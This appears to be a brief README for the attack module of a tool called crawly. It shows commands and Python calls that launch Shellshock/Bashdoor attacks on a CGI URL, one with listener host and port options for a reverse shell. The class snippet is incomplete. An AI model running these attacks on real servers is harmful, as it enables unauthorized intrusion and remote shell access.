# Attack

# File

- [x] attack.py

This file contains attacking classes of crawly. Each class instancied is auto runned with the gived paremeters.

# Shellshock / Bashdoor

```
# CLI command
crawly -A http://www.test.com/cgi-bin/vuln.cgi --shellshock
crawly -A http://www.test.com/cgi-bin/vuln.cgi --bashdoor --lhost 192.168.1.2 --lport 4444
```
```python
class Shellshock:
    def __init__(self, URL)
    
>>> import crawly
>>> URL = "http://www.test.com/cgi-bin/vuln.cgi"
>>> crawly.Shellshock(URL)
>>> crawly.Bashdoor(URL)
```
